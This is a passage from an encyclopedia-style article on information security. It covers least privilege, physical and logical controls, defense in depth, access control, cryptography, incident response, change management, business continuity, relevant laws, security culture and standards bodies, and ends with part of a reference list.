An important logical control that is frequently overlooked is the principle of least privilege, which requires that an individual, program or system process not be granted any more access privileges than are necessary to perform the task.[147] A blatant example of the failure to adhere to the principle of least privilege is logging into Windows as user Administrator to read email and surf the web. Violations of this principle can also occur when an individual collects additional access privileges over time.[148] This happens when employees' job duties change, employees are promoted to a new position, or employees are transferred to another department.[149] The access privileges required by their new duties are frequently added onto their already existing access privileges, which may no longer be necessary or appropriate.[150]

Physical[edit]
Physical controls monitor and control the environment of the work place and computing facilities.[151] They also monitor and control access to and from such facilities and include doors, locks, heating and air conditioning, smoke and fire alarms, fire suppression systems, cameras, barricades, fencing, security guards, cable locks, etc. Separating the network and workplace into functional areas are also physical controls.[152]
An important physical control that is frequently overlooked is separation of duties, which ensures that an individual can not complete a critical task by himself.[153] For example, an employee who submits a request for reimbursement should not also be able to authorize payment or print the check.[154] An applications programmer should not also be the server administrator or the database administrator; these roles and responsibilities must be separated from one another.[155]

Defense in depth[edit]
 The onion model of defense in depth
Main article: Defense in depth (computing)
Information security must protect information throughout its lifespan, from the initial creation of the information on through to the final disposal of the information.[156] The information must be protected while in motion and while at rest. During its lifetime, information may pass through many different information processing systems and through many different parts of information processing systems.[157] There are many different ways the information and information systems can be threatened. To fully protect the information during its lifetime, each component of the information processing system must have its own protection mechanisms.[158] The building up, layering on, and overlapping of security measures is called "defense in depth."[159] In contrast to a metal chain, which is famously only as strong as its weakest link, the defense in depth strategy aims at a structure where, should one defensive measure fail, other measures will continue to provide protection.[160]
Recall the earlier discussion about administrative controls, logical controls, and physical controls. The three types of controls can be used to form the basis upon which to build a defense in depth strategy.[142] With this approach, defense in depth can be conceptualized as three distinct layers or planes laid one on top of the other.[161] Additional insight into defense in depth can be gained by thinking of it as forming the layers of an onion, with data at the core of the onion, people the next outer layer of the onion, and network security, host-based security, and application security forming the outermost layers of the onion.[162] Both perspectives are equally valid, and each provides valuable insight into the implementation of a good defense in depth strategy.[163]

Classification[edit]
An important aspect of information security and risk management is recognizing the value of information and defining appropriate procedures and protection requirements for the information.[164] Not all information is equal and so not all information requires the same degree of protection.[165] This requires information to be assigned a security classification.[166] The first step in information classification is to identify a member of senior management as the owner of the particular information to be classified. Next, develop a classification policy.[167] The policy should describe the different classification labels, define the criteria for information to be assigned a particular label, and list the required security controls for each classification.[168]
Some factors that influence which classification information should be assigned include how much value that information has to the organization, how old the information is and whether or not the information has become obsolete.[169] Laws and other regulatory requirements are also important considerations when classifying information.[170] The Information Systems Audit and Control Association (ISACA) and its Business Model for Information Security also serves as a tool for security professionals to examine security from a systems perspective, creating an environment where security can be managed holistically, allowing actual risks to be addressed.[171]
The type of information security classification labels selected and used will depend on the nature of the organization, with examples being:[168]

In the business sector, labels such as: Public, Sensitive, Private, Confidential.
In the government sector, labels such as: Unclassified, Unofficial, Protected, Confidential, Secret, Top Secret, and their non-English equivalents.[172]
In cross-sectoral formations, the Traffic Light Protocol, which consists of: White, Green, Amber, and Red.
All employees in the organization, as well as business partners, must be trained on the classification schema and understand the required security controls and handling procedures for each classification.[173] The classification of a particular information asset that has been assigned should be reviewed periodically to ensure the classification is still appropriate for the information and to ensure the security controls required by the classification are in place and are followed in their right procedures.[174]

Access control[edit]
Access to protected information must be restricted to people who are authorized to access the information.[175] The computer programs, and in many cases the computers that process the information, must also be authorized.[176] This requires that mechanisms be in place to control the access to protected information.[176] The sophistication of the access control mechanisms should be in parity with the value of the information being protected; the more sensitive or valuable the information the stronger the control mechanisms need to be.[177] The foundation on which access control mechanisms are built start with identification and authentication.[178]
Access control is generally considered in three steps: identification, authentication, and authorization.[179][92]

Identification[edit]
Identification is an assertion of who someone is or what something is. If a person makes the statement "Hello, my name is John Doe" they are making a claim of who they are.[180] However, their claim may or may not be true. Before John Doe can be granted access to protected information it will be necessary to verify that the person claiming to be John Doe really is John Doe.[181] Typically the claim is in the form of a username. By entering that username you are claiming "I am the person the username belongs to".[182]

Authentication[edit]
Authentication is the act of verifying a claim of identity. When John Doe goes into a bank to make a withdrawal, he tells the bank teller he is John Doe, a claim of identity.[183] The bank teller asks to see a photo ID, so he hands the teller his driver's license.[184] The bank teller checks the license to make sure it has John Doe printed on it and compares the photograph on the license against the person claiming to be John Doe.[185] If the photo and name match the person, then the teller has authenticated that John Doe is who he claimed to be. Similarly, by entering the correct password, the user is providing evidence that he/she is the person the username belongs to.[186]
There are three different types of information that can be used for authentication:[187][188]

Something you know: things such as a PIN, a password, or your mother's maiden name[189][190]
Something you have: a driver's license or a magnetic swipe card[191][192]
Something you are: biometrics, including palm prints, fingerprints, voice prints, and retina (eye) scans[193]
Strong authentication requires providing more than one type of authentication information (two-factor authentication).[194] The username is the most common form of identification on computer systems today and the password is the most common form of authentication.[195] Usernames and passwords have served their purpose, but they are increasingly inadequate.[196] Usernames and passwords are slowly being replaced or supplemented with more sophisticated authentication mechanisms such as Time-based One-time Password algorithms.[197]

Authorization[edit]
After a person, program or computer has successfully been identified and authenticated then it must be determined what informational resources they are permitted to access and what actions they will be allowed to perform (run, view, create, delete, or change).[198] This is called authorization. Authorization to access information and other computing services begins with administrative policies and procedures.[199] The policies prescribe what information and computing services can be accessed, by whom, and under what conditions. The access control mechanisms are then configured to enforce these policies.[200] Different computing systems are equipped with different kinds of access control mechanisms. Some may even offer a choice of different access control mechanisms.[201] The access control mechanism a system offers will be based upon one of three approaches to access control, or it may be derived from a combination of the three approaches.[92]
The non-discretionary approach consolidates all access control under a centralized administration.[202] The access to information and other resources is usually based on the individuals function (role) in the organization or the tasks the individual must perform.[203][204] The discretionary approach gives the creator or owner of the information resource the ability to control access to those resources.[202] In the mandatory access control approach, access is granted or denied basing upon the security classification assigned to the information resource.[175]
Examples of common access control mechanisms in use today include role-based access control, available in many advanced database management systems; simple file permissions provided in the UNIX and Windows operating systems;[205] Group Policy Objects provided in Windows network systems; and Kerberos, RADIUS, TACACS, and the simple access lists used in many firewalls and routers.[206]
To be effective, policies and other security controls must be enforceable and upheld. Effective policies ensure that people are held accountable for their actions.[207] The U.S. Treasury's guidelines for systems processing sensitive or proprietary information, for example, states that all failed and successful authentication and access attempts must be logged, and all access to information must leave some type of audit trail.[208]
Also, the need-to-know principle needs to be in effect when talking about access control. This principle gives access rights to a person to perform their job functions.[209] This principle is used in the government when dealing with difference clearances.[210] Even though two employees in different departments have a top-secret clearance, they must have a need-to-know in order for information to be exchanged. Within the need-to-know principle, network administrators grant the employee the least amount of privilege to prevent employees from accessing more than what they are supposed to.[211] Need-to-know helps to enforce the confidentiality-integrity-availability triad. Need-to-know directly impacts the confidential area of the triad.[212]

Cryptography[edit]
Main article: Cryptography
Information security uses cryptography to transform usable information into a form that renders it unusable by anyone other than an authorized user; this process is called encryption.[213] Information that has been encrypted (rendered unusable) can be transformed back into its original usable form by an authorized user who possesses the cryptographic key, through the process of decryption.[214] Cryptography is used in information security to protect information from unauthorized or accidental disclosure while the information is in transit (either electronically or physically) and while information is in storage.[92]
Cryptography provides information security with other useful applications as well, including improved authentication methods, message digests, digital signatures, non-repudiation, and encrypted network communications.[215] Older, less secure applications such as Telnet and File Transfer Protocol (FTP) are slowly being replaced with more secure applications such as Secure Shell (SSH) that use encrypted network communications.[216] Wireless communications can be encrypted using protocols such as WPA/WPA2 or the older (and less secure) WEP. Wired communications (such as ITU‑T G.hn) are secured using AES for encryption and X.1035 for authentication and key exchange.[217] Software applications such as GnuPG or PGP can be used to encrypt data files and email.[218]
Cryptography can introduce security problems when it is not implemented correctly.[219] Cryptographic solutions need to be implemented using industry-accepted solutions that have undergone rigorous peer review by independent experts in cryptography.[220] The length and strength of the encryption key is also an important consideration.[221] A key that is weak or too short will produce weak encryption.[221] The keys used for encryption and decryption must be protected with the same degree of rigor as any other confidential information.[222] They must be protected from unauthorized disclosure and destruction, and they must be available when needed.[223] Public key infrastructure (PKI) solutions address many of the problems that surround key management.[92]

Process[edit]
The terms "reasonable and prudent person", "due care", and "due diligence" have been used in the fields of finance, securities, and law for many years. In recent years these terms have found their way into the fields of computing and information security.[127] U.S. Federal Sentencing Guidelines now make it possible to hold corporate officers liable for failing to exercise due care and due diligence in the management of their information systems.[224]
In the business world, stockholders, customers, business partners, and governments have the expectation that corporate officers will run the business in accordance with accepted business practices and in compliance with laws and other regulatory requirements. This is often described as the "reasonable and prudent person" rule. A prudent person takes due care to ensure that everything necessary is done to operate the business by sound business principles and in a legal, ethical manner. A prudent person is also diligent (mindful, attentive, ongoing) in their due care of the business.
In the field of information security, Harris[225]
offers the following definitions of due care and due diligence:

"Due care are steps that are taken to show that a company has taken responsibility for the activities that take place within the corporation and has taken the necessary steps to help protect the company, its resources, and employees[226]." And, [Due diligence are the] "continual activities that make sure the protection mechanisms are continually maintained and operational."[227]

Attention should be made to two important points in these definitions.[228][229] First, in due care, steps are taken to show; this means that the steps can be verified, measured, or even produce tangible artifacts.[230][231] Second, in due diligence, there are continual activities; this means that people are actually doing things to monitor and maintain the protection mechanisms, and these activities are ongoing.[232]
Organizations have a responsibility with practicing duty of care when applying information security. The Duty of Care Risk Analysis Standard (DoCRA)[233] provides principles and practices for evaluating risk.[234] It considers all parties that could be affected by those risks.[235] DoCRA helps evaluate safeguards if they are appropriate in protecting others from harm while presenting a reasonable burden.[236] With increased data breach litigation, companies must balance security controls, compliance, and its mission.[237]

Security governance[edit]
See also: Information Security Governance
The Software Engineering Institute at Carnegie Mellon University, in a publication titled Governing for Enterprise Security (GES) Implementation Guide, defines characteristics of effective security governance. These include:[238]

An enterprise-wide issue
Leaders are accountable
Viewed as a business requirement
Risk-based
Roles, responsibilities, and segregation of duties defined
Addressed and enforced in policy
Adequate resources committed
Staff aware and trained
A development life cycle requirement
Planned, managed, measurable, and measured
Reviewed and audited
Incident response plans[edit]
This section needs expansion. You can help by adding to it.  (January 2018)
An incident response plan (IRP) is a group of policies that dictate an organizations reaction to a cyber attack. Once an security breach has been identified the plan is initiated.[239] It is important to note that there can be legal implications to a data breach. Knowing local and federal laws is critical.[240] Every plan is unique to the needs of the organization, and it can involve skill sets that are not part of an IT team.[241] For example, a lawyer may be included in the response plan to help navigate legal implications to a data breach.[citation needed]
As mentioned above every plan is unique but most plans will include the following:[242]

Preparation[edit]
Good preparation includes the development of an Incident Response Team (IRT).[243] Skills need to be used by this team would be, penetration testing, computer forensics, network security, etc.[244] This team should also keep track of trends in cybersecurity and modern attack strategies.[245] A training program for end users is important as well as most modern attack strategies target users on the network.[242]

Identification[edit]
This part of the incident response plan identifies if there was a security event.[246] When an end user reports information or an admin notices irregularities, an investigation is launched. An incident log is a crucial part of this step.[247] All of the members of the team should be updating this log to ensure that information flows as fast as possible.[248] If it has been identified that a security breach has occurred the next step should be activated.[249]

Containment[edit]
In this phase, the IRT works to isolate the areas that the breach took place to limit the scope of the security event.[250] During this phase it is important to preserve information forensically so it can be analyzed later in the process.[251] Containment could be as simple as physically containing a server room or as complex as segmenting a network to not allow the spread of a virus.[252]

Eradication[edit]
This is where the threat that was identified is removed from the affected systems.[253] This could include deleting malicious files, terminating compromised accounts, or deleting other components.[254][255] Some events do not require this step, however it is important to fully understand the event before moving to this step.[256] This will help to ensure that the threat is completely removed.[252]

Recovery[edit]
This stage is where the systems are restored back to original operation.[257] This stage could include the recovery of data, changing user access information, or updating firewall rules or policies to prevent a breach in the future.[258][259] Without executing this step, the system could still be vulnerable to future security threats.[252]

Lessons Learned[edit]
In this step information that has been gathered during this process is used to make future decisions on security.[260] This step is crucial to the ensure that future events are prevented. Using this information to further train admins is critical to the process.[261] This step can also be used to process information that is distributed from other entities who have experienced a security event.[262]

Change management[edit]
Main article: Change Management (ITSM)
Change management is a formal process for directing and controlling alterations to the information processing environment.[263][264] This includes alterations to desktop computers, the network, servers, and software.[265] The objectives of change management are to reduce the risks posed by changes to the information processing environment and improve the stability and reliability of the processing environment as changes are made.[266] It is not the objective of change management to prevent or hinder necessary changes from being implemented.[267][268]
Any change to the information processing environment introduces an element of risk.[269] Even apparently simple changes can have unexpected effects.[270] One of management's many responsibilities is the management of risk.[271][272] Change management is a tool for managing the risks introduced by changes to the information processing environment.[273] Part of the change management process ensures that changes are not implemented at inopportune times when they may disrupt critical business processes or interfere with other changes being implemented.[274]
Not every change needs to be managed.[275][276] Some kinds of changes are a part of the everyday routine of information processing and adhere to a predefined procedure, which reduces the overall level of risk to the processing environment.[277] Creating a new user account or deploying a new desktop computer are examples of changes that do not generally require change management.[278] However, relocating user file shares, or upgrading the Email server pose a much higher level of risk to the processing environment and are not a normal everyday activity.[279] The critical first steps in change management are (a) defining change (and communicating that definition) and (b) defining the scope of the change system.[280]
Change management is usually overseen by a change review board composed of representatives from key business areas,[281] security, networking, systems administrators, database administration, application developers, desktop support, and the help desk.[282] The tasks of the change review board can be facilitated with the use of automated work flow application.[283] The responsibility of the change review board is to ensure the organization's documented change management procedures are followed.[284] The change management process is as follows[285]

Request: Anyone can request a change.[286][287] The person making the change request may or may not be the same person that performs the analysis or implements the change.[288][289] When a request for change is received, it may undergo a preliminary review to determine if the requested change is compatible with the organizations business model and practices, and to determine the amount of resources needed to implement the change.[290]
Approve: Management runs the business and controls the allocation of resources therefore, management must approve requests for changes and assign a priority for every change.[291] Management might choose to reject a change request if the change is not compatible with the business model, industry standards or best practices.[292][293] Management might also choose to reject a change request if the change requires more resources than can be allocated for the change.[294]
Plan: Planning a change involves discovering the scope and impact of the proposed change; analyzing the complexity of the change; allocation of resources and, developing, testing, and documenting both implementation and back-out plans.[295] Need to define the criteria on which a decision to back out will be made.[296]
Test: Every change must be tested in a safe test environment, which closely reflects the actual production environment, before the change is applied to the production environment.[297] The backout plan must also be tested.[298]
Schedule: Part of the change review board's responsibility is to assist in the scheduling of changes by reviewing the proposed implementation date for potential conflicts with other scheduled changes or critical business activities.[299]
Communicate: Once a change has been scheduled it must be communicated.[300] The communication is to give others the opportunity to remind the change review board about other changes or critical business activities that might have been overlooked when scheduling the change.[301] The communication also serves to make the help desk and users aware that a change is about to occur.[302] Another responsibility of the change review board is to ensure that scheduled changes have been properly communicated to those who will be affected by the change or otherwise have an interest in the change.[303][304]
Implement: At the appointed date and time, the changes must be implemented.[305][306] Part of the planning process was to develop an implementation plan, testing plan and, a back out plan.[307][308] If the implementation of the change should fail or, the post implementation testing fails or, other "drop dead" criteria have been met, the back out plan should be implemented.[309]
Document: All changes must be documented.[310][311] The documentation includes the initial request for change, its approval, the priority assigned to it, the implementation,[312] testing and back out plans, the results of the change review board critique, the date/time the change was implemented,[313] who implemented it, and whether the change was implemented successfully, failed or postponed.[314][315]
Post-change review: The change review board should hold a post-implementation review of changes.[316] It is particularly important to review failed and backed out changes. The review board should try to understand the problems that were encountered, and look for areas for improvement.[316]
Change management procedures that are simple to follow and easy to use can greatly reduce the overall risks created when changes are made to the information processing environment.[317] Good change management procedures improve the overall quality and success of changes as they are implemented.[318] This is accomplished through planning, peer review, documentation, and communication.[319]
ISO/IEC 20000, The Visible OPS Handbook: Implementing ITIL in 4 Practical and Auditable Steps[320] (Full book summary),[321] and ITIL all provide valuable guidance on implementing an efficient and effective change management program information security.[322]

Business continuity[edit]
Business continuity management (BCM) concerns arrangements aiming to protect an organization's critical business functions from interruption due to incidents, or at least minimize the effects.[323][324] BCM is essential to any organization to keep technology and business in line with current threats to the continuation of business as usual.[325] The BCM should be included in an organizations risk analysis plan to ensure that all of the necessary business functions have what they need to keep going in the event of any type of threat to any business function.[326]
It encompasses:

Analysis of requirements, e.g., identifying critical business functions, dependencies and potential failure points, potential threats and hence incidents or risks of concern to the organization;[327][328]
Specification, e.g., maximum tolerable outage periods; recovery point objectives (maximum acceptable periods of data loss);[329]
Architecture and design, e.g., an appropriate combination of approaches including resilience (e.g. engineering IT systems and processes for high availability,[330] avoiding or preventing situations that might interrupt the business), incident and emergency management (e.g., evacuating premises, calling the emergency services, triage/situation[331] assessment and invoking recovery plans), recovery (e.g., rebuilding) and contingency management (generic capabilities to deal positively with whatever occurs using whatever resources are available);[332]
Implementation, e.g., configuring and scheduling backups, data transfers, etc., duplicating and strengthening critical elements; contracting with service and equipment suppliers;
Testing, e.g., business continuity exercises of various types, costs and assurance levels;[333]
Management, e.g., defining strategies, setting objectives and goals; planning and directing the work; allocating funds, people and other resources; prioritization relative to other activities; team building, leadership, control, motivation and coordination with other business functions and activities[334] (e.g., IT, facilities, human resources, risk management, information risk and security, operations); monitoring the situation, checking and updating the arrangements when things change; maturing the approach through continuous improvement, learning and appropriate investment;[citation needed]
Assurance, e.g., testing against specified requirements; measuring, analyzing, and reporting key parameters; conducting additional tests, reviews and audits for greater confidence that the arrangements will go to plan if invoked.[335]
Whereas BCM takes a broad approach to minimizing disaster-related risks by reducing both the probability and the severity of incidents, a disaster recovery plan (DRP) focuses specifically on resuming business operations as quickly as possible after a disaster.[336] A disaster recovery plan, invoked soon after a disaster occurs, lays out the steps necessary to recover critical information and communications technology (ICT) infrastructure.[337] Disaster recovery planning includes establishing a planning group, performing risk assessment, establishing priorities, developing recovery strategies, preparing inventories and documentation of the plan, developing verification criteria and procedure, and lastly implementing the plan.[338]

Laws and regulations[edit]
 Privacy International 2007 privacy rankinggreen: Protections and safeguardsred: Endemic surveillance societies
Below is a partial listing of governmental laws and regulations in various parts of the world that have, had, or will have, a significant effect on data processing and information security.[339][340] Important industry sector regulations have also been included when they have a significant impact on information security.[339]

The UK Data Protection Act 1998 makes new provisions for the regulation of the processing of information relating to individuals, including the obtaining, holding, use or disclosure of such information.[341][342] The European Union Data Protection Directive (EUDPD) requires that all E.U. members adopt national regulations to standardize the protection of data privacy for citizens throughout the E.U.[343][344]
The Computer Misuse Act 1990 is an Act of the U.K. Parliament making computer crime (e.g., hacking) a criminal offense.[345] The act has become a model upon which several other countries,[346] including Canada and the Republic of Ireland, have drawn inspiration from when subsequently drafting their own information security laws.[347][348]
The E.U.'s Data Retention Directive (annulled) required internet service providers and phone companies to keep data on every electronic message sent and phone call made for between six months and two years.[349]
The Family Educational Rights and Privacy Act (FERPA) (20 U.S.C. § 1232 g; 34 CFR Part 99) is a U.S. Federal law that protects the privacy of student education records.[350] The law applies to all schools that receive funds under an applicable program of the U.S. Department of Education.[351] Generally, schools must have written permission from the parent or eligible student[351][352] in order to release any information from a student's education record.[353]
The Federal Financial Institutions Examination Council's (FFIEC) security guidelines for auditors specifies requirements for online banking security.[354]
The Health Insurance Portability and Accountability Act (HIPAA) of 1996 requires the adoption of national standards for electronic health care transactions and national identifiers for providers, health insurance plans, and employers.[355] Additionally, it requires health care providers, insurance providers and employers to safeguard the security and privacy of health data.[356]
The Gramm–Leach–Bliley Act of 1999 (GLBA), also known as the Financial Services Modernization Act of 1999, protects the privacy and security of private financial information that financial institutions collect, hold, and process.[357]
Section 404 of the Sarbanes–Oxley Act of 2002 (SOX) requires publicly traded companies to assess the effectiveness of their internal controls for financial reporting in annual reports they submit at the end of each fiscal year.[358] Chief information officers are responsible for the security, accuracy, and the reliability of the systems that manage and report the financial data.[359] The act also requires publicly traded companies to engage with independent auditors who must attest to, and report on, the validity of their assessments.[360]
The Payment Card Industry Data Security Standard (PCI DSS) establishes comprehensive requirements for enhancing payment account data security.[361] It was developed by the founding payment brands of the PCI Security Standards Council — including American Express, Discover Financial Services, JCB, MasterCard Worldwide,[362] and Visa International — to help facilitate the broad adoption of consistent data security measures on a global basis.[363] The PCI DSS is a multifaceted security standard that includes requirements for security management, policies, procedures, network architecture, software design, and other critical protective measures.[364]
State security breach notification laws (California and many others) require businesses, nonprofits, and state institutions to notify consumers when unencrypted "personal information" may have been compromised, lost, or stolen.[365]
The Personal Information Protection and Electronics Document Act (PIPEDA) of Canada supports and promotes electronic commerce by protecting personal information that is collected, used or disclosed in certain circumstances,[366][367] by providing for the use of electronic means to communicate or record information or transactions and by amending the Canada Evidence Act, the Statutory Instruments Act and the Statute Revision Act.[368][369][370]
Greece's Hellenic Authority for Communication Security and Privacy (ADAE) (Law 165/2011) establishes and describes the minimum information security controls that should be deployed by every company which provides electronic communication networks and/or services in Greece in order to protect customers' confidentiality.[371] These include both managerial and technical controls (e.g., log records should be stored for two years).[372]
Greece's Hellenic Authority for Communication Security and Privacy (ADAE) (Law 205/2013) concentrates around the protection of the integrity and availability of the services and data offered by Greek telecommunication companies.[373] The law forces these and other related companies to build, deploy, and test appropriate business continuity plans and redundant infrastructures.[374]
The US Department of Defense (DoD) issued DoD Directive 8570 in 2004, supplemented by DoD Directive 8140, requiring all DoD employees and all DoD contract personnel involved in information assurance roles and activities to earn and maintain various industry Information Technology (IT) certifications in an effort to ensure that all DoD personnel involved in network infrastructure defense have minimum levels of IT industry recognized knowledge, skills and abilities (KSA). Andersson and Reimers (2019) report these certifications range from CompTIA's A+ and Security+ through the ICS2.org's CISSP, etc.. [375]

Culture[edit]
Describing more than simply how security aware employees are, information security culture is the ideas, customs, and social behaviors of an organization that impact information security in both positive and negative ways.[376] Cultural concepts can help different segments of the organization work effectively or work against effectiveness towards information security within an organization. The way employees think and feel about security and the actions they take can have a big impact on information security in organizations. Roer & Petric (2017) identify seven core dimensions of information security culture in organizations:[377]

Attitudes: Employees’ feelings and emotions about the various activities that pertain to the organizational security of information.[378]
Behaviors: Actual or intended activities and risk-taking actions of employees that have direct or indirect impact on information security.
Cognition: Employees' awareness, verifiable knowledge, and beliefs regarding practices, activities, and self-efficacy relation that are related to information security.
Communication: Ways employees communicate with each other, sense of belonging, support for security issues, and incident reporting.
Compliance: Adherence to organizational security policies, awareness of the existence of such policies and the ability to recall the substance of such policies.
Norms: Perceptions of security-related organizational conduct and practices that are informally deemed either normal or deviant by employees and their peers, e.g. hidden expectations regarding security behaviors and unwritten rules regarding uses of information-communication technologies.
Responsibilities: Employees' understanding of the roles and responsibilities they have as a critical factor in sustaining or endangering the security of information, and thereby the organization.
Andersson and Reimers (2014) found that employees often do not see themselves as part of the organization Information Security "effort" and often take actions that ignore organizational information security best interests.[379] Research shows information security culture needs to be improved continuously. In Information Security Culture from Analysis to Change, authors commented, "It's a never ending process, a cycle of evaluation and change or maintenance." To manage the information security culture, five steps should be taken: pre-evaluation, strategic planning, operative planning, implementation, and post-evaluation.[380]

Pre-Evaluation: to identify the awareness of information security within employees and to analyze current security policy
Strategic Planning: to come up a better awareness-program, we need to set clear targets. Clustering people is helpful to achieve it
Operative Planning: create a good security culture based on internal communication, management buy-in, security awareness, and training programs
Implementation: should feature commitment of management, communication with organizational members, courses for all organizational members, and commitment of the employees[380]
Post-evaluation: to better gauge the effectiveness of the prior steps and build on continuous improvement
Sources of standards[edit]
Main article: Cyber Security Standards
The International Organization for Standardization (ISO) is an international standards organization organized as a consortium of national standards institutions from 167 countries, coordinated through a secretariat in Geneva, Switzerland. ISO is the world's largest developer of international standards. The International Electrotechnical Commission (IEC) is an international standards organization that deals with electrotechnology and cooperates closely with ISO. ISO/IEC 15443: "Information technology – Security techniques – A framework for IT security assurance", ISO/IEC 27002: "Information technology – Security techniques – Code of practice for information security management", ISO/IEC 20000: "Information technology – Service management", and ISO/IEC 27001: "Information technology – Security techniques – Information security management systems – Requirements" are of particular interest to information security professionals.
The US National Institute of Standards and Technology (NIST) is a non-regulatory federal agency within the U.S. Department of Commerce. The NIST Computer Security Division
develops standards, metrics, tests, and validation programs as well as publishes standards and guidelines to increase secure IT planning, implementation, management, and operation. NIST is also the custodian of the U.S. Federal Information Processing Standard publications (FIPS).
The Internet Society is a professional membership society with more than 100 organizations and over 20,000 individual members in over 180 countries. It provides leadership in addressing issues that confront the future of the internet, and it is the organizational home for the groups responsible for internet infrastructure standards, including the Internet Engineering Task Force (IETF) and the Internet Architecture Board (IAB). The ISOC hosts the Requests for Comments (RFCs) which includes the Official Internet Protocol Standards and the RFC-2196 Site Security Handbook.
The Information Security Forum (ISF) is a global nonprofit organization of several hundred leading organizations in financial services, manufacturing, telecommunications, consumer goods, government, and other areas. It undertakes research into information security practices and offers advice in its biannual Standard of Good Practice and more detailed advisories for members.
The Institute of Information Security Professionals (IISP) is an independent, non-profit body governed by its members, with the principal objective of advancing the professionalism of information security practitioners and thereby the professionalism of the industry as a whole. The institute developed the IISP Skills Framework. This framework describes the range of competencies expected of information security and information assurance professionals in the effective performance of their roles. It was developed through collaboration between both private and public sector organizations, world-renowned academics, and security leaders.[381]
The German Federal Office for Information Security (in German Bundesamt für Sicherheit in der Informationstechnik (BSI)) BSI-Standards 100–1 to 100-4 are a set of recommendations including "methods, processes, procedures, approaches and measures relating to information security".[382] The BSI-Standard 100-2 IT-Grundschutz Methodology describes how information security management can be implemented and operated. The standard includes a very specific guide, the IT Baseline Protection Catalogs (also known as IT-Grundschutz Catalogs). Before 2005, the catalogs were formerly known as "IT Baseline Protection Manual". The Catalogs are a collection of documents useful for detecting and combating security-relevant weak points in the IT environment (IT cluster). The collection encompasses as of September 2013 over 4,400 pages with the introduction and catalogs. The IT-Grundschutz approach is aligned with to the ISO/IEC 2700x family.
The European Telecommunications Standards Institute standardized a catalog of information security indicators, headed by the Industrial Specification Group (ISG) ISI.

See also[edit]

Backup
Capability-based security
Computer security (cybersecurity)
Data breach
Data-centric security
Enterprise information security architecture
Identity-based security
Information infrastructure
Information security audit
Information security indicators
Information security management
Information security standards
Information technology
Information technology security audit
IT risk
ITIL security management
Kill chain
List of computer security certifications
Mobile security
Network Security Services
Privacy engineering
Privacy software
Privacy-enhancing technologies
Security bug
Security convergence
Security information management
Security level management
Security of Information Act
Security service (telecommunication)
Single sign-on
Verification and validation

References[edit]


^ Curry, Michael; Marshall, Byron; Crossler, Robert E.; Correia, John (2018-04-25). "InfoSec Process Action Model (IPAM): Systematically Addressing Individual Security Behavior". ACM SIGMIS Database: The DATABASE for Advances in Information Systems. 49 (SI): 49–66. doi:10.1145/3210530.3210535. ISSN 0095-0033. S2CID 14003960.

^ Joshi, Chanchala; Singh, Umesh Kumar (August 2017). "Information security risks management framework – A step towards mitigating security risks in university network". Journal of Information Security and Applications. 35: 128–137. doi:10.1016/j.jisa.2017.06.006. ISSN 2214-2126.

^ Fletcher, Martin (14 December 2016). "An introduction to information risk". The National Archives. Retrieved 23 February 2022.

^ "SANS Institute: Information Security Resources". www.sans.org. Retrieved 2020-10-31.This article cites Wikipedia (or sources that take information from Wikipedia), in a circular manner. Please help improve this article by repairing any insufficient attribution if necessary and adding citations to reliable sources. Unsourced or poorly sourced material may be challenged and removed.Find sources: "Information security" – news · newspapers · books · scholar · JSTOR (October 2022) (Learn how and when to remove this template message)

^ Daniel, Kent; Titman, Sheridan (August 2006). "Market Reactions to Tangible and Intangible Information". The Journal of Finance. 61 (4): 1605–1643. doi:10.1111/j.1540-6261.2006.00884.x. SSRN 414701.

^ Fink, Kerstin (2004). Knowledge Potential Measurement and Uncertainty. Deutscher Universitätsverlag. ISBN 978-3-322-81240-7. OCLC 851734708.

^ Keyser, Tobias (2018-04-19), "Security policy", The Information Governance Toolkit, CRC Press, pp. 57–62, doi:10.1201/9781315385488-13, ISBN 978-1-315-38548-8, retrieved 2021-05-28

^ Danzig, Richard (1995). "The big three: Our greatest security risks and how to address them". DTIC ADA421883. {{cite journal}}: Cite journal requires |journal= (help)

^ Lyu, M.R.; Lau, L.K.Y. (2000). "Firewall security: policies, testing and performance evaluation". Proceedings 24th Annual International Computer Software and Applications Conference. COMPSAC2000. IEEE Comput. Soc: 116–121. doi:10.1109/cmpsac.2000.884700. ISBN 0-7695-0792-1. S2CID 11202223.

^ "How the Lack of Data Standardization Impedes Data-Driven Healthcare", Data-Driven Healthcare, Hoboken, NJ, USA: John Wiley & Sons, Inc., p. 29, 2015-10-17, doi:10.1002/9781119205012.ch3, ISBN 978-1-119-20501-2, retrieved 2021-05-28

^ Lent, Tom; Walsh, Bill (2009), "Rethinking Green Building Standards for Comprehensive Continuous Improvement", Common Ground, Consensus Building and Continual Improvement: International Standards and Sustainable Building, West Conshohocken, PA: ASTM International, pp. 1–1–10, doi:10.1520/stp47516s, ISBN 978-0-8031-4507-8, retrieved 2021-05-28

^ a b Cherdantseva Y. and Hilton J.: "Information Security and Information Assurance. The Discussion about the Meaning, Scope and Goals". In: Organizational, Legal, and Technological Dimensions of Information System Administrator. Almeida F., Portela, I. (eds.). IGI Global Publishing. (2013)

^ ISO/IEC 27000:2009 (E). (2009). Information technology – Security techniques – Information security management systems – Overview and vocabulary. ISO/IEC.

^ Committee on National Security Systems: National Information Assurance (IA) Glossary, CNSS Instruction No. 4009, 26 April 2010.

^ ISACA. (2008). Glossary of terms, 2008. Retrieved from http://www.isaca.org/Knowledge-Center/Documents/Glossary/glossary.pdf

^ Pipkin, D. (2000). Information security: Protecting the global enterprise. New York: Hewlett-Packard Company.

^ B., McDermott, E., & Geer, D. (2001). Information security is information risk management. In Proceedings of the 2001 Workshop on New Security Paradigms NSPW ‘01, (pp. 97 – 104). ACM. doi:10.1145/508171.508187

^ Anderson, J. M. (2003). "Why we need a new definition of information security". Computers & Security. 22 (4): 308–313. doi:10.1016/S0167-4048(03)00407-3.

^ Venter, H. S.; Eloff, J. H. P. (2003). "A taxonomy for information security technologies". Computers & Security. 22 (4): 299–307. doi:10.1016/S0167-4048(03)00406-1.

^ Gold, S (December 2004). "Threats looming beyond the perimeter". Information Security Technical Report. 9 (4): 12–14. doi:10.1016/s1363-4127(04)00047-0. ISSN 1363-4127.

^ Parker, Donn B. (January 1993). "A Comprehensive List of Threats To Information". Information Systems Security. 2 (2): 10–14. doi:10.1080/19393559308551348. ISSN 1065-898X.

^ Sullivant, John (2016), "The Evolving Threat Environment", Building a Corporate Culture of Security, Elsevier, pp. 33–50, doi:10.1016/b978-0-12-802019-7.00004-3, ISBN 978-0-12-802019-7, retrieved 2021-05-28

